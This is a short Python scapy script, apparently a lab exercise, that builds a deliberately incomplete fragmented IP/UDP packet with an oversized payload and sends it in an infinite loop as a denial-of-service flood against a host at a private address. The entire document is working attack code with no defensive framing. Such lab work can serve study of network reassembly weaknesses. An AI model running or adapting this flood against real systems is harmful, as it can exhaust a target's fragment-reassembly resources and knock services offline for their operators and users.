#!/usr/bin/python3
from scapy.all import *

# Construct IP header
print('SENDING INCOMPLETE IP PACKET')
print('Source is : 192.168.65.132')
print('Destination is : 192.168.65.131')
ip = IP(src="192.168.65.132", dst="192.168.65.131")
ip.id = 1000
# Identification 
ip.frag = 0
# Offset of this IP fragment
ip.flags = 1
# Flags

# Construct UDP header
udp = UDP(sport=7070, dport=9090)
udp.len = 65535
# This should be the combined length of all fragments

# Construct payload
payload = 'A' * 65507
pkt = ip/udp/payload # For other fragments, we should use ip/payload
pkt[UDP].checksum = 0 # Set the checksum field to zero
print('Sending DoS Attack.....')
send(pkt, verbose=0)
c=1
while 1:
	print('Sending Fragment # ', c)
	send(pkt, verbose=0)
	c=c+1



